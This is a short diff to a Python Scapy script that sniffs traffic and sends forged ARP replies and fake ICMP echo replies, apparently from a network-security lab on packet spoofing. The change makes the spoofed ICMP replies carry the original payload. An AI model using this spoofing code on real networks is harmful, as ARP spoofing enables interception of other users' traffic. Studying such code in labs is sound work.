@@ -14,7 +14,6 @@ def sniff_(pkt):
     try:
         # Handle ARP packets
         if pkt[ARP].op == 1:
-            #ether = Ether(dst = pkt[Ether].src, src = '02:42:0a:09:00:99', type = pkt[Ether].type) 
             arp = ARP(op = 2, hwsrc = pkt[Ether].dst, psrc = pkt[ARP].pdst, pdst = pkt[ARP].psrc)
             send(arp, verbose=0)
             print(pkt.sprintf("spoofed ARP Reply--> %ARP.pdst% -> %ARP.psrc%"))
@@ -26,8 +25,7 @@ def sniff_(pkt):
             ip = IP(src = pkt[IP].dst, dst = pkt[IP].src, ihl = pkt[IP].ihl)
             icmp = ICMP(type = 0, id = pkt[ICMP].id, seq = pkt[ICMP].seq)
             data = pkt[Raw].load
-            #send(ip/icmp/data, verbose=0)
-            send(ip/icmp, verbose=0)            
+            send(ip/icmp/data, verbose=0)
         elif pkt[ICMP].type == 0:
             print(pkt.sprintf("ICMP Reply --> %IP.src% -> %IP.dst%"))
         
